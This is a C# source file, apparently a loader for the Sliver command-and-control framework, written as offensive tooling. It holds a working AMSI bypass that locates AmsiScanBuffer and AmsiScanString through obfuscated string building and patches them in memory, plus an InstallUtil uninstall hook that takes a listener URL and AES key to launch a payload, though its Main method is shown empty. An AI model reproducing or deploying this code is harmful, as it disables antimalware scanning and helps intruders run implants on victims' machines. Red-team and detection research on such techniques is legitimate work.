using System;
using System.IO;
using System.Text;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using System.Linq;
using System.Collections.Generic;
using System.Configuration.Install;
using System.Management.Automation.Host;
using System.Runtime.Remoting.Contexts;

namespace SliverBypassLoader
{
    class altbypass
    {
        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", SetLastError = true)] static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GetCurrentProcess();
        public static void Main(string[] args) 
        { 
        
        }

        // Dynamically search for and patch AmsiScanBuffer and AmsiScanString
        static int Bypass()
        {
            Char c1, c2, c3, c4, c5, c6, c7, c8, c9, c10;
            c1 = 'A';
            c2 = 's';
            c3 = 'c';
            c4 = 'n';
            c5 = 'l';
            c6 = 't';
            c7 = 'z';
            c8 = 'U';
            c9 = 'y';
            c10 = 'o';
            string[] filePaths = Directory.GetFiles(@"c:\wind" + c10 + "ws\\s" + c9 + "stem32", "a?s?.d*");
            string libname = (filePaths[0].Substring(filePaths[0].Length - 8));
            try
            {
                uint lpflOldProtect;
                var lib = LoadLibrary(libname);
                // AmsiUacInitialize
                var baseaddr = GetProcAddress(lib, c1 + "m" + c2 + "i" + c8 + "a" + c3 + "I" + c4 + "i" + c6 + "ia" + c5 + "i" + c7 + "e");
                int buffsize = 1000;
                var randoffset = baseaddr - buffsize;
                IntPtr hProcess = GetCurrentProcess();
                byte[] addrBuf = new byte[buffsize];
                IntPtr nRead = IntPtr.Zero;
                ReadProcessMemory(hProcess, randoffset, addrBuf, addrBuf.Length, out nRead);
                byte[] asb = new byte[7] { 0x4c, 0x8b, 0xdc, 0x49, 0x89, 0x5b, 0x08 };
                Int32 asbrelloc = (PatternAt(addrBuf, asb)).First();
                var funcaddr = baseaddr - (buffsize - asbrelloc);
                VirtualProtect(funcaddr, new UIntPtr(8), 0x40, out lpflOldProtect);
                Marshal.Copy(new byte[] { 0x90, 0xC3 }, 0, funcaddr, 2);
                byte[] ass = new byte[7] { 0x48, 0x83, 0xec, 0x38, 0x45, 0x33, 0xdb };
                Int32 assrelloc = (PatternAt(addrBuf, ass)).First();
                funcaddr = baseaddr - (buffsize - assrelloc);
                VirtualProtect(funcaddr, new UIntPtr(8), 0x40, out lpflOldProtect);
                Marshal.Copy(new byte[] { 0x90, 0xC3 }, 0, funcaddr, 2);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                Console.WriteLine("Could not patch " + libname + "...");
            }

            return 0;
        }

        public static IEnumerable<int> PatternAt(byte[] source, byte[] pattern)
        {
            for (int i = 0; i < source.Length; i++)
            {
                if (source.Skip(i).Take(pattern.Length).SequenceEqual(pattern))
                {
                    yield return i;
                }
            }
        }
    }

    // InstallUtill uninstall bypass
    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string listenerUrl = this.Context.Parameters["listenerUrl"];
            string compressAlgorithm = this.Context.Parameters["compressAlgorithm"];
            string targetBinary = this.Context.Parameters["targetBinary"];
            string aesKey = this.Context.Parameters["aesKey"];
            string aesIv = this.Context.Parameters["aesIv"];

            if (listenerUrl == null)
            {
                throw new InstallException("Mandatory parameter 'listenerUrl' is missing");
            }

            if (compressAlgorithm == null)
            {
                compressAlgorithm = "";
            }

            if (targetBinary == null)
            {
                throw new InstallException("Mandatory parameter 'targetBinary' is missing");
            }

            if (aesKey == null)
            {
                throw new InstallException("Mandatory parameter 'aesKey' is missing");
            }

            if (aesIv == null)
            {
                throw new InstallException("Mandatory parameter 'aesIv' is missing");
            }

            string[] args = new string[] { listenerUrl, compressAlgorithm, targetBinary, aesKey, aesIv };
            altbypass.Main(args);
        }
    }
}
